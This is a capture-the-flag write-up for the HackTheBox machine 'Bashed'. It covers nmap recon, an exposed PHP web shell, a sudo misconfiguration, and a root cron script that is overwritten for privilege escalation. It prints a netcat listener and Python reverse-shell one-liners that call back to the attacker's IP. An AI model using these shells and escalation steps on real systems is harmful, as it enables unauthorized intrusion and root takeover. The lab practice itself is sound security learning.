# HackTheBox Writeup: Bashed


As a career blue teamer I feel it's important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is [HackTheBox](https://hackthebox.eu).

The machine named *Bashed* was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.

# Recon
As usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine's IP.

```
nmap -sC -sV -oA nmap 10.10.10.68
Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST
Nmap scan report for 10.10.10.68
Host is up (0.17s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.71 seconds
```


Ok, TCP 80 / HTTP is listening.  There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.

```
nmap --script http-enum 10.10.10.68
Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST
Nmap scan report for 10.10.10.68
Host is up (0.17s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /uploads/: Potentially interesting folder
Nmap done: 1 IP address (1 host up) scanned in 46.16 seconds
```

The /dev directory contains a couple of scripts.  Visiting http://10.10.10.68/dev/phpbash.php in a browser presented me with a web shell (!).  I'm able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.

![bashed_user](/content/images/2018/05/bashed_user.png)

**user = owned**

# Gaining a Foothold

I need to get a "real" shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.

First, I'll need a listener on my local attacker machine:

```
nc -v -n -l -p 4444
```

Now I drop this python script directly in the web shell.  The ampersand (&) at the end just backgrounds the process.
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<my HTB IP address>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &
```

Note that the field "my HTB IP address" would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I'm connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.
    
![bashed_revshell1](/content/images/2018/05/bashed_revshell1.png)
    
Now I have a reverse shell on the target system, but it's still limited. I try using python again to escape to a bash shell.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```
![bashed_revshell2](/content/images/2018/05/bashed_revshell2.png)

Great, now I'm at a more typical shell as user www-data.  Time to enumerate.

# Enumeration

I checked many many things, but looking at sudo capabilities turned up some useful information.

```
www-data@bashed:/var/www/html/dev$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

So, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.

```
www-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager
sudo -i -u scriptmanager
scriptmanager@bashed:~$
```

From the [sudo man page](https://www.sudo.ws/man/1.8.3/sudo.man.html):

> -i [command]
> The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell's -c option. ==If no command is specified, an interactive shell is executed.== sudo attempts to change to that user's home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.

Bingo, now I'm scriptmanager.  More enumeration.

```
scriptmanager@bashed:/var/www/html/dev$ ls -l /
ls -l /
total 80
drwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin
drwxr-xr-x   3 root          root           4096 Dec  4 11:17 boot
drwxr-xr-x  19 root          root           4240 Jan 12 20:25 dev
drwxr-xr-x  89 root          root           4096 Dec  4 17:09 etc
drwxr-xr-x   4 root          root           4096 Dec  4 13:53 home
lrwxrwxrwx   1 root          root             32 Dec  4 11:14 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4 11:16 lib
drwxr-xr-x   2 root          root           4096 Dec  4 11:13 lib64
drwx------   2 root          root          16384 Dec  4 11:13 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4 11:13 media
drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
drwxr-xr-x   2 root          root           4096 Dec  4 11:18 opt
dr-xr-xr-x 122 root          root              0 Jan 12 20:24 proc
drwx------   3 root          root           4096 Dec  4 13:03 root
drwxr-xr-x  18 root          root            500 Jan 12 20:25 run
drwxr-xr-x   2 root          root           4096 Dec  4 11:18 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4 18:06 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Jan 12 20:24 sys
drwxrwxrwt  10 root          root           4096 Jan 12 21:07 tmp
drwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr
drwxr-xr-x  12 root          root           4096 Dec  4 11:20 var
lrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

Strange, ```scripts``` isn't a typical top-level directory and it's owned by scriptmanager. I move into the directory and investigate further.

```
scriptmanager@bashed:/scripts$ ls -al
ls -al
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 20 08:14 .
drwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py
-rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt
```

Examining these two files leads me to believe that ```test.txt``` containts output from the ```test.py``` script.  However,```test.txt``` is owned by root while the directory it resides in and the ```test.py``` script that generates it are owned by scriptmanager.

This implies that root is executing the script as itself, so the output is written with root ownership. If I can replace ```test.py``` with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!

# Privilege Escalation

```
scriptmanager@bashed:/scripts$ mv test.py old-test.py
scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<my HTB IP address>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > test.py
```

Here I moved/renamed the existing ```test.py``` and created my own with the reverse shell code. This isn't necessary, you could just add the reverse shell bits to the end of the existing file.

Again note the "my HTB IP address field" and port number. I want a second reverse shell that's separate from the one I'm currently working in, so I selected a new port (5555).

I'm not exactly sure how or when root executes the ```test.py``` script.  Given the autonomous nature of these HTB systems I assume it's just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.

After a few minutes...

![94582eeb-e301-49ba-9bf2-64769b24438c](/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png)

**root = owned**

# Conclusion
Looking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:

1. Look at the simple or obvious things first.  Don't assume every target is going to require some elaborate, complicated method to exploit.
2. Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code>

Did you conquer Bashed using some other method?  Feel free to reach out to me on [Twitter](https://twitter.com/aj_mcquay), I'd love to talk about it.

